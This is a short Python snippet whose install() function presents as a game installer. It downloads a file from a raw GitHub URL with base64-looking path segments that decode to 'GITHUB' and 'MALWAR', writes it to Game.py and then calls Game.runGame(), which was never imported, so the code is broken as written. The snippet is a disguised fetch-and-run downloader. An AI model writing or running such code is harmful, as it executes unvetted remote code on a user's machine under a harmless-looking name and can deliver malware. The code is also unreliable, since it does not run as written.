import requests
def install():
    response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/GameCode.py")
    with open("Game.py", "w") as file:
        file.write(response.text) ##Get game code

    Game.runGame()